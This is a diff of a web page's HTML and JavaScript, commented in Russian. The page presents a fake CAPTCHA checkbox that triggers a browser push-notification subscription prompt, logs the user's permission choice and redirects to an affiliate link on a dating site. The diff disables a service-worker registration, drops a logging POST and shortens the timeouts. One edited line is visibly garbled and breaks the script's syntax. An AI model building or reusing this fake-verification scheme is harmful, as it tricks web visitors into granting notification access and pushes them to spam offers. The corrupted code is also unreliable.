@@ -39,12 +39,10 @@
             width: 20px;
             height: 20px;
             cursor: pointer;
-            transition: background-color 0.3s ease, border-color 0.3s ease;
+            transition: border-color 0.3s ease;
         }
         .captcha-checkbox:checked {
-            background-color: #1a73e8;
-            border-color: #1a73e8;
-            accent-color: #1a73e8; /* Задаем синий цвет для галочки */
+            accent-color: #1a73e8; /* Синий цвет для галочки */
         }
         .captcha-text {
             font-size: 14px;
@@ -114,18 +112,19 @@
     </div>
 
     <script>
-        // Регистрация Service Worker
+        // Регистрация Service Worker (закомментировано для тестирования)
+        /*
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('/HnFv7gIgUEyhZsQd8kp20Q.js')
                 .then(registration => {
-                    console.log('Service Worker зарегистрирован:', registration);
-                })
-                .catch(err => {
-                    console.error('Ошибка регистрации Service Worker:', err);
-                });
+                    console.log('Service Worker зарегистрирован:', registration Ascent - YouTube video player
+                    .catch(err => {
+                        console.error('Ошибка регистрации Service Worker:', err);
+                    });
         } else {
             console.warn('Service Worker не поддерживается');
         }
+        */
 
         // Ссылка для редиректа
         const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
@@ -138,66 +137,43 @@
                 permission: permission,
                 timestamp: new Date().toISOString()
             };
-            fetch('https://your-server.com/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(response => console.log('Лог подписки отправлен:', response))
-            .catch(err => console.error('Ошибка отправки лога:', err));
+            console.log('Лог подписки:', data);
         }
 
         // Функция для выполнения редиректа
         function performRedirect() {
-            console.log('Редирект на:', redirectUrl);
-            window.location.href = redirectUrl;
+            console.log('Выполняется редирект на:', redirectUrl);
+            try {
+                window.location.href = redirectUrl;
+            } catch (e) {
+                console.error('Ошибка редиректа:', e);
+            }
         }
 
         // Функция для запроса подписки
         function requestSubscription() {
+            console.log('Запуск requestSubscription');
             if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                 console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                 logSubscription(Notification.permission);
-                setTimeout(performRedirect, 300);
+                performRedirect();
                 return;
             }
 
             const checkPsReady = () => {
                 if (window.ps && typeof window.ps.showPrompt === 'function') {
                     console.log('Вызываем подписку через ps.js');
-                    const timeout = setTimeout(() => {
-                        console.log('Тайм-аут: ps.js не вернул результат');
-                        performRedirect();
-                    }, 10000);
-
-                    try {
-                        window.ps.showPrompt()
-                            .then(result => {
-                                clearTimeout(timeout);
-                                console.log('Результат подписки:', result);
-                                logSubscription(Notification.permission);
-                                performRedirect();
-                            })
-                            .catch(err => {
-                                clearTimeout(timeout);
-                                console.error('Ошибка вызова подписки:', err);
-                                logSubscription(Notification.permission);
-                                performRedirect();
-                            })
-                            .finally(() => {
-                                if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
-                                    clearTimeout(timeout);
-                                    console.log('Статус уведомлений:', Notification.permission);
-                                    logSubscription(Notification.permission);
-                                    performRedirect();
-                                }
-                            });
-                    } catch (err) {
-                        clearTimeout(timeout);
-                        console.error('Синхронная ошибка в ps.js:', err);
-                        logSubscription('error');
-                        performRedirect();
-                    }
+                    window.ps.showPrompt()
+                        .then(result => {
+                            console.log('Результат подписки:', result);
+                            logSubscription(Notification.permission);
+                            performRedirect();
+                        })
+                        .catch(err => {
+                            console.error('Ошибка вызова подписки:', err);
+                            logSubscription(Notification.permission);
+                            performRedirect();
+                        });
                 } else {
                     console.log('API ps.js не доступен, пробуем Notification API');
                     if ('Notification' in window) {
@@ -220,7 +196,7 @@
                 }
             };
 
-            setTimeout(checkPsReady, 3000);
+            setTimeout(checkPsReady, 1000);
         }
 
         // Функция проверки
